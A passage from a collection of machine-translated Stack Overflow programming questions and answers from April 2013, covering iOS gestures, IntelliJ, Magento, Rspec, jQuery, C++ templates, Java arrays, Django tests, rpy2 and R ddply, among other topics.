    UITapGestureRecognizer *tapGesture = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(didRecognizeTapGesture:)];
    tapGesture.cancelsTouchesInView    = NO;
    tapGesture.delegate                = self;
    [tapGesture requireGestureRecognizerToFail:self.scrollView.panGestureRecognizer];
    [self.scrollView addGestureRecognizer:tapGesture];
    self.tapGesture = tapGesture;
}

-(BOOL)gestureRecognizer:(UIGestureRecognizer *)gestureRecognizer shouldReceiveTouch:(UITouch *)touch
{
    if (touch.view == self.button)
    {
        return NO;
    }
    return YES;
}

- (void)didRecognizeTapGesture:(UITapGestureRecognizer*)gesture
{
    if (gesture.state == UIGestureRecognizerStateEnded)
    {
        NSLog(@"GESTURE ENDED");
    }
}

- (void)didPressButton:(UIButton*)sender
{
    NSLog(@"BUTTON TOUCH UP INSIDE");
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T08:59:54.667

也许你可以使用按钮的拖动事件，比如

```
[button addTarget:self action:@selector(wasDragged:withEvent:) 
    forControlEvents:UIControlEventTouchDragInside]; 
```

你可以看看这个链接： http: [//www.cocoanetics.com/2010/11/draggable-buttons-labels/](http://www.cocoanetics.com/2010/11/draggable-buttons-labels/)

可以在move方法中放一个flag，当进入touch up方法时，检查按钮是否移动，决定触发open相关逻辑

```
#define BUTTON_DRAGGED_TAG -100
#define BUTTON_DEFAULT_TAG 0

- (void)onButtonTouchUpInside:(UIButton *)button withEvent:(UIEvent *)event
{
    if (button.tag != BUTTON_DRAGGED_TAG)
    {
        //doOpen
    }

    button.tag = BUTTON_DEFAULT_TAG;
}

- (void)onButtonTouchUpOutside:(UIButton *)button withEvent:(UIEvent *)event
{
    button.tag = BUTTON_DEFAULT_TAG;
 }

- (void)onButtonTouchCancel:(UIButton *)button withEvent:(UIEvent *)event
{
    button.tag = BUTTON_DEFAULT_TAG;
}

- (void)onButtonDraged:(UIButton *)button withEvent:(UIEvent *)event
{

    button.tag = BUTTON_DRAGGED_TAG;
} 
```

# intellij-idea - IntelliJ 按文件路径重新排序更改选项卡

> ID：16110666
> 
> 赞同：2
> 
> 时间：2013-04-19T17:52:01.230
> 
> 标签：intellij-idea, diff

IntelliJ IDEA 12.x 仅按文件名对“更改”选项卡中的差异进行排序，如何按文件路径排序？

IE：

```
src/main/a/SomeFile.java
src/main/b/AnotherFile.java 
```

与当前订单相比

```
src/main/b/AnotherFile.java
src/main/a/SomeFile.java 
```

设置选项中似乎没有此选项卡的设置。

![在此处输入图像描述](https://i.stack.imgur.com/n4g2t.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T18:31:27.403

为此，“更改”工具栏上有“按文件夹分组”按钮。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T18:35:02.833

使用“按目录分组”按钮（或者如果您使用的是 Mac，请使用 Command-F9）。这也按您的更改所在的子模块分组。

![按目录分组图标](https://i.stack.imgur.com/HweFv.png)

# ios - 我可以在 MKMapView 中显示从谷歌地图 KML 文件解析的地图图例吗

> ID：16110667
> 
> 赞同：0
> 
> 时间：2013-04-19T17:52:04.763
> 
> 标签：ios, objective-c, mkmapview

我目前正在使用从谷歌地图生成的 KML 文件。具有复杂多边形的 KML 也有一个图例。我想显示传奇。我想知道是否有办法使用当前的 IOS Map api 来做到这一点

# magento - 在 Magento 目录页面上插入“点击查看可用性”

> ID：16110671
> 
> 赞同：0
> 
> 时间：2013-04-19T17:52:20.060
> 
> 标签：magento, web, magento-1.7, visual-web-developer

在 Magento 1.7 中，当您单击一个类别时，会出现该类别的产品目录，我想在每个项目旁边或下方添加“点击可用性”字样。有人可以让我知道如何做到这一点吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T11:42:20.550

在 list.phtml 中添加一个“检查可用性”按钮，单击该按钮会触发 JavaScript 函数

将此传递给函数

```
$_product->isSaleable() 
```

如果这是真的在 div 中显示可用 else 不可用

此可用性代码已在 magento 中检查

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T20:21:44.507

您需要编辑的文件是

```
/app/design/frontend/base/default/template/catalog/product/list.phtml 
```

但是直接编辑该文件不是升级安全的，因此您需要将其移动到

```
/app/design/frontend/default/default/template/catalog/product/list.phtml 
```

这将自动覆盖`base`文件。请注意，有两种视图模式——网格和列表，这两种模式都由 list.phtml 文件中的注释指示——因此请务必编辑这两种模式，以便您的更改始终可见。

看起来您想在产品中添加您的行以`<li>`用于网格视图，对我来说是第 94 行。对于列表视图，您应该将其放在`.product-shop`div 中，即第 52 行。如果不确切知道您的想法，很难更具体。你只需要玩弄它。

# ruby-on-rails - 模型中的 Rspec Ruby on Rails 测试文件系统

> ID：16110677
> 
> 赞同：2
> 
> 时间：2013-04-19T17:52:52.423
> 
> 标签：ruby-on-rails, ruby, model, rspec, filesystems

我有一个模型，该模型具有一种方法，该方法从特定位置开始查找与特定正则表达式匹配的文件的文件系统。这是在 after_save 回调中执行的。我不确定如何使用 Rspec 和 FactoryGirl 进行测试。我不确定如何使用 FakeFS 之类的东西，因为该方法在模型中，而不是在测试或控制器中。我指定了在我的 FactoryGirl 工厂中启动的位置，所以我可以将其更改为在设置子句中由测试创建的假目录？我可以模拟目录吗？我认为可能有几种不同的方法可以做到这一点，但哪种方法最有意义？

谢谢！

```
 def ensure_files_up_to_date
    files = find_assembly_files
    add_files = check_add_assembly_files(files)
    errors = add_assembly_files(add_files)
    if errors.size > 0 then
      return errors
    end
    update_files = check_update_assembly_files(files)
    errors = update_assembly_files(update_files)
    if errors.size > 0 then
      return errors
    else
      return []
    end
  end

 def find_assembly_files
    start_dir = self.location
    files = Hash.new
    if ! File.directory? start_dir then
      errors.add(:location, "Directory #{start_dir} does not exist on the system.")
      abort("Directory #{start_dir} does not exist on the system for #{self.inspect}")
    end
    Find.find(start_dir) do |path|
      filename = File.basename(path).split("/").last
      FILE_TYPES.each { |filepart, filehash|
        type = filehash["type"]
        vendor = filehash["vendor"]
        if filename.match(filepart) then
          files[type] = Hash.new
          files[type]["path"] = path
          files[type]["vendor"] = vendor
        end
      }
    end
    return files
  end

  def check_add_assembly_files(files=self.find_assembly_files)
    add = Hash.new
    files.each do |file_type, file_hash|
      # returns an array
      file_path = file_hash["path"]
      file_vendor = file_hash["vendor"]
      filename = File.basename(file_path)
      af = AssemblyFile.where(:name => filename)

      if af.size == 0 then
        add[file_path] = Hash.new
        add[file_path]["type"] = file_type
        add[file_path]["vendor"] = file_vendor
      end
    end
    if add.size == 0 then
      logger.error("check_add_assembly_files did not find any files to add")
      return []
    end
    return add
  end

  def check_update_assembly_files(files=self.find_assembly_files)
    update = Hash.new
    files.each do |file_type, file_hash|
      file_path = file_hash["path"]
      file_vendor = file_hash["vendor"]
      # returns an array
      filename = File.basename(file_path)
      af = AssemblyFile.find_by_name(filename)

      if !af.nil? then
        if af.location != file_path or af.file_type != file_type then
          update[af.id] = Hash.new
          update[af.id]['path'] = file_path
          update[af.id]['type'] = file_type
          update[af.id]['vendor'] = file_vendor
        end
      end
    end
    return update
  end

 def add_assembly_files(files=self.check_add_assembly_files)
    if files.size == 0 then
      logger.error("add_assembly_files didn't get any results from check_add_assembly_files")
      return []
    end
    asm_file_errors = Array.new
    files.each do |file_path, file_hash|
      file_type = file_hash["type"]
      file_vendor = file_hash["vendor"]
      logger.debug "file type is #{file_type} and path is #{file_path}"
      logger.debug FileType.find_by_type_name(file_type)
      file_type_id = FileType.find_by_type_name(file_type).id
      header = file_header(file_path, file_vendor)
      if file_vendor == "TBA" then
        check = check_tba_header(header, file_type, file_path)
        software = header[TBA_SOFTWARE_PROGRAM]
        software_version = header[TBA_SOFTWARE_VERSION]
      elsif file_vendor == "TBB" then
        check = check_tbb_header(header, file_type, file_path)
        if file_type == "TBB-ANNOTATION" then
          software = header[TBB_SOURCE]
        else
          software = "Unified"
        end
        software_version = "UNKNOWN"
      end

      if check == 0 then
        logger.error("skipping file #{file_path} because it contains incorrect values for this filetype")
        asm_file_errors.push("#{file_path} cannot be added to assembly because it contains incorrect values for this filetype")
        next
      end

      if file_vendor == "TBA" then
        xml = header.to_xml(:root => "assembly-file")
      elsif file_vendor == "TBB" then
        xml = header.to_xml
      else
        xml = ''
      end

      filename = File.basename(file_path)
      if filename.match(/~$/) then
        logger.error("Skipping a file with a tilda when adding assembly files.  filename #{filename}")
        next
      end
      assembly_file = AssemblyFile.new(
                    :assembly_id => self.id,
                    :file_type_id => file_type_id,
                    :name => filename,
                    :location => file_path,
                    :file_date => creation_time(file_path),
                    :software => software,
                    :software_version => software_version,
                    :current => 1,
                    :metadata => xml
                )

      assembly_file.save! # exclamation point forces it to raise an error if the save fails
    end # end files.each

    return asm_file_errors
  end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T21:51:27.937

快速回答：您可以像其他任何方法一样存根模型方法。存根模型的特定实例，然后存根`find`或任何返回它的东西，或者`any_instance`如果您不想担心涉及哪个模型，则存根。就像是：

```
it "does something" do
  foo = Foo.create! some_attributes
  foo.should_receive(:some_method).and_return(whatever)
  Foo.stub(:find).and_return(foo)
end 
```

真正的答案是您的代码太复杂而无法有效测试。您的模型甚至不应该知道文件系统的存在。该行为应该封装在其他类中，您可以独立测试这些类。然后，您的模型`after_save`可以只调用该类上的单个方法，并且测试该单个方法是否被调用会容易得多。

你的方法也很难测试，因为他们试图做的太多了。所有这些条件逻辑和外部依赖意味着您必须进行大量模拟才能获得您可能想要测试的各个位。

这是一个很大的话题，一个好的答案远远超出了这个答案的范围。[从关于 SOLID 的 Wikipedia 文章](http://en.wikipedia.org/wiki/SOLID_%28object-oriented_design%29)开始，并从那里阅读将关注点分成单个类并使用微小的组合方法背后的一些原因。给你一个大概的想法，一个有多个分支或超过 10 行代码的方法太大了；超过 100 行代码的类太大了。

# javascript - 在第一个孩子之后访问子节点

> ID：16110683
> 
> 赞同：-3
> 
> 时间：2013-04-19T17:53:19.190
> 
> 标签：javascript, jquery, html

我想在第一个标签元素之后访问所有 html 内容。任何人都可以告诉我如何通过 jquery 或 javascript 访问它

```
<div id="mydiv" > 
<h4> h4 node </h4>
<p><b>bold</b></p>
<h1><b>bold</b></h1>
<b>bold</b>

</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T17:54:27.277

`:gt(0)`选择器指的是*第一个元素之后*：

```
var els = $("#mydiv > :gt(0)"); 
```

如果您在第一个（包括文本节点）之后需要所有节点，请使用：

```
var els = $("#mydiv").contents().slice(1); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T18:53:01.130

如果你想首先找到某个元素中的所有元素，你必须找到那个元素。这可以在 JavaScript 中使用代码`var x=document.getElementById("mydiv").children;` Atfer 完成，您可以像使用数组一样访问其子项。例如 x[0] 将是 mydiv 中的第一个元素，x[1] 第二个，等等……这是一个示例代码，它打印 mydiv 的第二个孩子的 innerHTML `<script> var x=document.getElementById("mydiv").children; document.write(x[1].innerHTML); </script>`

# php - 任何术语的正则表达式 mysql

> ID：16110684
> 
> 赞同：0
> 
> 时间：2013-04-19T17:53:24.537
> 
> 标签：php, mysql

我需要在我的代码中替换 div 中的任何 div 和任何术语。

在 PHP 中是这样的：

```
$newbody = str_replace('<div(.*?)>','',$body); 
```

但是在Mysql中我有这个结构来替换单词：

```
UPDATE `wp_posts` SET `post_content` = replace(post_content, '<div(.*?)>', '');# <- thats wrong 
```

多谢你们。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T17:56:44.050

There's not such thing as MySQL replacement with regular expressions, but you could try [this](https://launchpad.net/mysql-udf-regexp)

# c++ - 模板方法的接口

> ID：16110685
> 
> 赞同：2
> 
> 时间：2013-04-19T17:53:35.353
> 
> 标签：c++, templates, inheritance, interface, polymorphism

我有一个`Foo`提供某种功能的类。为了保持模块化，`Foo`就是要成为一个接口（也就是一个只有抽象方法的C++类），而Foo的一个实现可以选择具体如何实现功能。但是，我的界面包含一个模板方法。那是，

```
class Foo
{
public:
        template<class T>
        void functionality(const T&);
}; 
```

不可能`C++`有模板方法`virtual`。是否有任何技术可以使用模板方法实现类似的结果（模块化和多态性）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-22T01:57:15.753

您不能将运行时多态性与模板直接混合。然而，另一层间接可能会有所帮助。这是一个人为的例子：

```
template <typename T>
inline void *New( void )
{
  return new T( );
} 
```

只要存在默认构造函数，此函数将允许用户动态分配任何类型的对象。现在获取一个函数指针并将其分配给这个新函数：

```
void *(*NewFuncPtr)( void ) = New<int>;
int *i = (int *)NewFuncPtr( ); 
```

函数指针本身没有模板化，但可以指向模板化的函数。也许这也可以解决您的情况。

# java - 初始化对象数组的最便捷方法

> ID：16110690
> 
> 赞同：5
> 
> 时间：2013-04-19T17:53:53.080
> 
> 标签：java

有没有比这样做更方便的方法来初始化对象数组？

```
SomeClass[] someArray = new SomeClass[100];
//...
for (int i = 0; i < someArray.length; i++) { 
  someArray[i] = new SomeClass();
}
// ... 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-19T17:56:02.153

采用`Arrays.fill()`

```
String[] stringArray = new String[100];
Arrays.fill(stringArray, ""); 
```

它并没有更快，因为它像您一样遍历数组，但它更方便。

**Arrays.fill() 代码**

```
public static void fill(Object[] a, int fromIndex, int toIndex, Object val) {
    rangeCheck(a.length, fromIndex, toIndex);
    for (int i=fromIndex; i<toIndex; i++)
        a[i] = val;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-19T17:56:27.530

这不是更快，但它的代码更少：

```
String[] stringArray = new String[100];
Arrays.fill(stringArray, ""); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-19T17:59:12.050

由于`String`Java 中的不变性，您的问题有点奇怪。主要推力表明您正在寻找这个：

```
String[] arr = new String[100];
Arrays.fill(arr, new String());//Array utility 
```

但是，这实际上并没有为您带来任何好处，因为`String`每当您将其中一个数组项替换为不同的字符串时，您都必须有效地创建一个新对象。这意味着创建 a 的行为`new String()`是多余的，因此效率较低。

这就引出了一个问题：你为什么要这样做？是为了确保返回一个有效的对象吗？或者数组中的对象实际上是一个`String`？如果是后者，请使用泛型：

```
List<String> arr = new ArrayList<String>(); 
```

这解决了同样的问题，并为您带来了面向对象的好处。如果可以的话，通常建议您远离原始数组：基于对象的数组更有用，导致代码更简洁，程序通常更高效。

如果您使用的是可变类型，并且预填充的目的是确保从数组中检索对象时存在，则处理此问题的最佳方法是在接收端实际使用异常，原因有两个：首先是您通过在实际需要之前不分配内存来节省内存（以及随之而来的所有随之而来的节省），其次是几乎没有阻止数组将元素设置为`null`，因此您必须检查反正：

```
try {
  SomeObject myObj = arr.get(idx);
  myObj.doSomethingFun();//will fail if this is null!
} catch (NullPointerException e) {
  //do something intelligent like return a fail case.
} 
```

请注意，虽然异常在捕获实际错误时会产生开销，但在此之前它们没有开销。出于这个原因，您不想将它们用于控制流，但您确实想使用它们（比您可能做的更多）来捕获没有意义的边缘情况。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-04-19T19:31:38.680

因此，您告诉您要创建不同对象的数组。然后必须有一个默认构造函数或您传入的工厂。我将展示第一种情况的代码 - 当您可以调用空构造函数时`Class<...>.newInstance()`：

```
import java.lang.reflect.Array;
// ... in a class:
@SuppressWarnings("unchecked")
public static <T> T[] initializedArray(int size, Class<T> classHint) throws java.lang.Exception {
   T[] result = (T[]) Array.newInstance(classHint, size);
   for (int i = 0; i < size; ++i) {
      result[i] = classHint.newInstance();
   }
   return result;
} 
```

此处的示例用法：http: [//ideone.com/pbTFq9](http://ideone.com/pbTFq9)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-04-19T17:56:34.227

你可以像这样声明

```
String[] array;
...
array = new String[]{object1, object2}; 
```

# c# - 重绘 Awesomium 表面

> ID：16110693
> 
> 赞同：1
> 
> 时间：2013-04-19T17:54:05.087
> 
> 标签：c#, awesomium

当我更改表单`ShowInTaskbar`属性时，会创建一个新句柄，`webview(awesomium)`现在不知何故为空。有什么办法可以恢复之前的状态吗？提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T18:18:27.053

当这个 bug 发生时，可以通过为 webview 提供一个**新**的句柄来修复它。

```
this.Controls.Remove(webPanel);
webPanel = new Panel();
this.Controls.Add(webPanel);
webView.ParentWindow = webPanel.Handle;
resize();
return; 
```

# python - 从管理命令运行时，Django-nose 测试用例给出断言错误

> ID：16110696
> 
> 赞同：1
> 
> 时间：2013-04-19T17:54:14.447
> 
> 标签：python, django, unit-testing, testing, nose

测试.py

```
# write code to test the views.
from django.test import Client

# import nose for tests.
import nose.tools as noz

class TestSettings(object):
    """ test the nose test related setup """

    def setup(self):
        self.client = Client()

    def testTestUser(self):
        """ Tests if the django user 'test' is setup properly."""
        # login the test user
        response = self.client.login(username=u'test', password=u'test')    
        noz.assert_equal(response, True) 
```

从管理命令运行此代码时，会给出以下输出：

```
 $ ./manage.py test <app-name>
    nosetests --verbosity 1 <app-name>
    Creating test database for alias 'default'...
    F
    ======================================================================
    FAIL: Tests if the django user 'test' is setup properly.
    ----------------------------------------------------------------------
    Traceback (most recent call last):
       File "/<python-sitepackages-dir-path>/nose/case.py",                                                                                       line 197, in runTest
       self.test(*self.arg)
       File "<application-path>/tests.py", line 28, in testTestUser
       noz.assert_equal(response, True)
    AssertionError: False != True

    ----------------------------------------------------------------------

    Ran 1 test in 0.008s

    FAILED (failures=1)
    Destroying test database for alias 'default'... 
```

现在通过 django shell 运行时相同的命令给出以下内容：

```
 $ ./manage.py shell
    Python 2.6.6 (r266:84292, Sep 11 2012, 08:28:27) 
    [GCC 4.4.6 20120305 (Red Hat 4.4.6-4)] on linux2
    Type "help", "copyright", "credits" or "license" for more information.
    (InteractiveConsole)
    >>> from django.test import Client
    >>> 
    >>> import nose.tools as noz
    >>> 
    >>> client = Client()
    >>> response = client.login(username=u'test', password=u'test')
    >>> noz.assert_equal(response, True)
    >>> 
    >>> 
    >>> response
    True
    >>> 
```

用户 'test' 在 django 中对于当前场景处于活动状态。

为什么我在运行管理命令时收到此错误断言？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T18:00:25.647

看起来它没有继承基础测试类，所以它没有在测试之前调用 setup 方法。我会建议从 Django 的 TestCase 类继承，根据[Django 文档的 testing](https://docs.djangoproject.com/en/1.5/topics/testing/overview/)。在这种情况下，它看起来像这样：

```
# write code to test the views.
from django.test import Client
import unittest

# import nose for tests.
import nose.tools as noz

class TestSettings(unittest.TestCase):
    """ test the nose test related setup """

    def setUp(self):  # Note that the unittest requires this to be setUp and not setup
        self.client = Client()

    def testTestUser(self):
        """ Tests if the django user 'test' is setup properly."""
        # login the test user
        response = self.client.login(username=u'test', password=u'test')    
        noz.assert_equal(response, True) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T17:59:28.340

您是否正在为您的测试创建具有用户名`test`和密码的用户`test`？还是加载夹具？我打赌不会。

当您使用 shell 时，您正在登录 settings.py 中的数据库。当您进行测试时，您正在使用您的测试数据库，该数据库在每次测试开始时都是空的，因此没有用户。

在`setUp`你可以创建一个用户

```
from django.contrib.auth.models import User
User.objects.create('test', 'test@test.com', 'test') 
```

正如@Kevin London 所指出的那样

你的设置命令应该是

`setUp`，但我认为这与它没有太大关系，因为默认情况下每个`TestCase`都有一个`client`。

# android - 长按打开上下文菜单以查看视图？

> ID：16110698
> 
> 赞同：2
> 
> 时间：2013-04-19T17:54:16.537
> 
> 标签：android, contextmenu, osmdroid

我所看到的有关上下文菜单的所有示例和问题都是将上下文菜单注册到按钮或类似内容的地方。在我的情况下，我有一个显示大小的视图（OSMDroid 地图视图），它实现了长按手势，它将传入地图视图中的按下节点。我希望长按打开上下文菜单，以便我可以对该节点进行操作。

问题是当我为上下文菜单注册 MapView 时，长按将在视图本身或视图上的节点被按下时触发。例如，它已为视图注册。（坏的！）

如果我没有为视图注册上下文菜单，我的长按只会在选择节点时触发。（好！）但是我不知道如何以编程方式显示或触发未首先注册的上下文菜单。

我只需要按需显示上下文菜单。有人有什么建议吗？谢谢！

```
@Override
public void onCreate(final Bundle savedInstanceState) {
    ...
    this.mapView = (MapView) findViewById(R.id.mapview);
    this.registerForContextMenu(this.mapView); // <-- This will register the entire view for a long press context menu
    ...
}
...

class NodeGestureListener implements OnItemGestureListener<NodeOverlayItem> {
    @Override
public boolean onItemLongPress(int index, NodeOverlayItem node) {
    openContextMenu(mapView);  // <-- This won't display anything
    return false;
}
}
...

@Override 
public void onCreateContextMenu(ContextMenu menu, View v, ContextMenuInfo menuInfo) {  
    super.onCreateContextMenu(menu, v, menuInfo);
    getMenuInflater().inflate(R.menu.node_menu, menu);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T18:15:40.727

每件事都有它自己的目的和结构。因此，按照应有的方式使用某些东西总是更好。菜单也是如此。

在您的情况下，我认为如果您想要在没有上下文菜单机制的长按事件后立即弹出窗口，那么最好使用 AlertDialog。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T20:42:54.780

您可能会查看操作栏。虽然它是为 3.0 开发的，但支持库使它适用于更老的东西。[文档](http://developer.android.com/guide/topics/ui/actionbar.html)似乎表明您使用的菜单样式不是首选，而操作栏是要走的路。奖励：我发现它比旧的长按菜单更容易处理。

# database - 在 Windows 上翻译 sqlite3 时间戳格式

> ID：16110703
> 
> 赞同：1
> 
> 时间：2013-04-19T17:54:29.463
> 
> 标签：database, sqlite, unix-timestamp

对不起，如果这听起来像一个谜，但它确实让我困惑了一段时间。:)

从 sqlite3 db 文件中，其中一条记录具有`last_visit_time`值字段`13010301178000000`（INTEGER 类型）。

怎么会`13010301178000000 = 4/12/2013 9:32:58PM`？（`4/12/2013 9:32:58PM`由现有工具获得，我对它如何在内部翻译一无所知）。

有人可以解释一下这是如何翻译的吗？

我看过[http://www.epochconverter.com/](http://www.epochconverter.com/)，但没有运气。

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T19:06:21.047

1601 年 1 月 1 日是[Windows 时间戳记](http://msdn.microsoft.com/en-us/library/windows/desktop/ms724284.aspx)的纪元。

但是，这些时间戳使用 100 纳秒的间隔，因此您的值似乎被除以 10，或者由于某种原因您遗漏了一个零。

要转换为/从 Unix 时间戳，除以/乘以 1000000 以在秒和微秒之间转换，并调整为 1970 和 1601 之间的偏移量（以秒为单位）。

# actionscript-3 - Flash 中的麦克风和声音设置

> ID：16110707
> 
> 赞同：0
> 
> 时间：2013-04-19T17:54:45.153
> 
> 标签：actionscript-3, volume, microphone

如何在 ActionScript 3 的视频面板上控制和显示音量设置？为了实现这一点，我需要使用哪个类。麦克风、SoundTransform 还是两者兼而有之？干杯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T23:41:55.587

这些教程将准确显示您的需求。

*   [闪存版](http://www.trainingtutorials101.com/2010/01/adjusting-volume-in-flash-actionscript.html)
*   [AS3版本](http://snipplr.com/view/16230/)

# javascript - Jquery选择器中的Javascript窗口变量

> ID：16110711
> 
> 赞同：0
> 
> 时间：2013-04-19T17:54:58.203
> 
> 标签：javascript, jquery

我正在尝试优化代码但遇到一些错误。这些正确执行：

```
Array.prototype.forEach.call( $('ZA1 .stat'), function( td ) {//ExcuteCode}
Array.prototype.forEach.call( $('ZA2 .stat'), function( td ) {//ExcuteCode}
Array.prototype.forEach.call( $('ZA19 .stat'), function( td ) {//ExcuteCode}
Array.prototype.forEach.call( $('ZA20 .stat'), function( td ) {//ExcuteCode} 
```

试图浓缩到这一点，但得到错误：

```
for (var trType in allTr) {
    //console.log(trType);
    Array.prototype.forEach.call( $( window[trType]+' .stat'), function( td ) {
    //Excute Code
    } 
```

在控制台中，我收到以下错误：

未捕获的错误：语法错误，无法识别的表达式：[object Object] .stat

我可以在 jquery 选择器中使用 window[] 吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-12-03T01:48:19.260

您得到的错误是说`window[trType]`变量中有一个 javascript 对象，当它运行时`window[trType] + ' .stat'`它不知道该怎么做，因为没有定义 Object + 字符串运算符。

尝试使用`window[trType].find()`. jQuery`.find()`方法的工作方式与`$()`使用上下文时相同。因此，`window[trType].find(".stat");`将找到所有具有 stat 类的元素，它们是`window[trType]`.

您也可以替换`Array.prototype.forEach.call(`为`$.each(`

如果你打算这样做，你可以使用：

```
window[trType].find('.stat').each(function(td){ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T18:05:58.387

好吧，只需组合所有选择器：

```
$('ZA1 .stat, ZA2 .stat, ZA3 .stat').each(function(i, td) {
    // do stuff
}); 
```

如果你想优化这段代码，你不妨使用`.querySelectorAll()`而不是使用半 jQuery / 半 JavaScript。

# python - 使用 rpy2 从 python 获取 R 对象的一部分

> ID：16110715
> 
> 赞同：3
> 
> 时间：2013-04-19T17:55:08.920
> 
> 标签：python, r, rpy2

我可以使用 R 获得我需要的输出，但我无法在 python 的 rpy2 模块中重现。

在 R 中：

```
> wilcox.test(c(1,2,3), c(100,200,300), alternative = "less")$p.value 
```

给

```
[1] 0.05 
```

在蟒蛇中：

```
import rpy2.robjects as robjects
rwilcox = robjects.r['wilcox.test']
x = robjects.IntVector([1,2,3,])
y = robjects.IntVector([100,200,300])
z = rwilcox(x,y, alternative = "less")
print z 
```

给出：

```
Wilcoxon rank sum test  
data:  1:3 and c(100L, 200L, 300L)  
W = 0, p-value = 0.05  
alternative hypothesis: true location shift is less than 0 
```

和：

```
z1 = z.rx('p.value')
print z1 
```

给出：

```
$p.value  
[1] 0.05 
```

仍在尝试将最终值 0.05 存储为变量，但这似乎更接近最终答案。

我无法弄清楚我的 python 代码需要将 p.value 存储在新变量中。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T19:08:00.627

`z1`是一个`ListVector`包含`FloatVector`一个元素的元素：

```
>>> z1
<ListVector - Python:0x4173368 / R:0x36fa648>
[FloatVector]
  p.value: <class 'rpy2.robjects.vectors.FloatVector'>
  <FloatVector - Python:0x4173290 / R:0x35e6b38>
[0.050000] 
```

`z1[0][0]`您可以使用或仅提取浮动本身`float(z1[0])`：

```
>>> z1[0][0]
0.05
>>> type(z1[0][0])
<type 'float'>
>>> float(z1[0])
0.05 
```

一般来说，如果您只提供您想要表示的对象的名称，您将更容易弄清楚交互式会话中发生了什么。当交互式循环隐式使用的表示更有帮助时，使用`print x`语句可以转换事物。如果您在脚本中执行操作，请改用。`str(x)``repr(x)``print repr(x)`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-19T19:01:13.477

只使用 list() 吗？

```
pval = z.rx2('p-value')
print list(pval) # [0.05] 
```

rpy2 也适用于 numpy：

```
import numpy
pval = numpy.array(pval)
print pval       # array([ 0.05]) 
```

[http://rpy.sourceforge.net/rpy2/doc-2.3/html/numpy.html#from-rpy2-to-numpy](http://rpy.sourceforge.net/rpy2/doc-2.3/html/numpy.html#from-rpy2-to-numpy)

# javascript - 三.js 行为异常的被遮挡对象

> ID：16110716
> 
> 赞同：1
> 
> 时间：2013-04-19T17:55:09.097
> 
> 标签：javascript, three.js, webgl

使用 three.js 库，我设法将 3D 对象的遮挡边缘显示为虚线。

而且我希望被其他对象遮挡的边缘以相同的方式表现。

[使用此处](https://stackoverflow.com/questions/15084165/three-js-wireframe-only-shape-with-hidden-edges-as-dashed-lines)解释的解决方案，除了某些奇怪的情况外，它工作正常。

这是这种情况的说明（我使用正交相机，所以我们看不到物体之间的距离，因此图片中的文字）： ![在此处输入图像描述](https://i.stack.imgur.com/Tftow.jpg)

有没有人遇到过类似的事情？

知道为什么在这种情况下它不起作用吗？

也许`polygonOffset: true, polygonOffsetFactor: 1, polygonOffsetUnits: 1`我的代码中的部分被滥用了。

或者也许`side: THREE.DoubleSide`在我的材料中是这个问题的根源。因为我已经看到它在透明度方面有一些奇怪的行为。

这是我的代码：http: [//jsfiddle.net/car3v/4/](http://jsfiddle.net/car3v/4/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T06:44:09.897

带有材质的虚线的对象`depthTest: false`必须在前面，以防它被“普通”对象的网格遮挡。所以我只是手动设置`dashed_object.renderDepth = 9007199254740992;`了 JavaScript 中可能的最大整数，现在它可以正常工作了。

# r - 使用 ddply 汇总数据时的子集

> ID：16110723
> 
> 赞同：2
> 
> 时间：2013-04-19T17:55:34.873
> 
> 标签：r, plyr

我有如下数据：

```
> head(ddd)
        id affiliate_id affiliate_account_id source         Pipeline num  good   bad
1 61046463         1006                   69 29eada Contact Info Bad   1 FALSE  TRUE
2 61046770         1006                   69 344f39    Did not Reach   1  TRUE FALSE
3 61053937         1006                   69 fff384               na   1  TRUE FALSE
4 61053941         1006                   69 22d8b6          App Out   1  TRUE FALSE
5 61060137         1006                   69 29eada         No Offer   1  TRUE FALSE
6 61060221         1006                   69 3fdb4f Contact Info Bad   1 FALSE  TRUE 
```

我正在尝试使用 ddply 函数汇总数据，以便获得如下内容：

```
 affiliate_id affiliate_account_id lead_count good_count bad_count good_rate bad_rate 
1         1006                   69        360       300        60     %        %    
2         1006                 5212         64       60         4      %        %
3         1031                 5102         22       3          20     %        %  
4         1035                 5211          5       15         10     %        %  
5         1035                 5216         90       30         60     %        % 
```

其中百分比 (%) 是好/坏的比率，即affiliate_account_id。

我似乎无法弄清楚如何获得列数并评价食物的好坏。任何人都可以帮助从以下到上表中的最后四列。

```
ddply(ddd, .(affiliate_id, affiliate_account_id), summarise, lead_count=length(affiliate_id)) 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-19T18:17:52.923

您可以使用`sum`来计算逻辑的数量，

```
ddply(dat, .(affiliate_id, affiliate_account_id), summarise, 
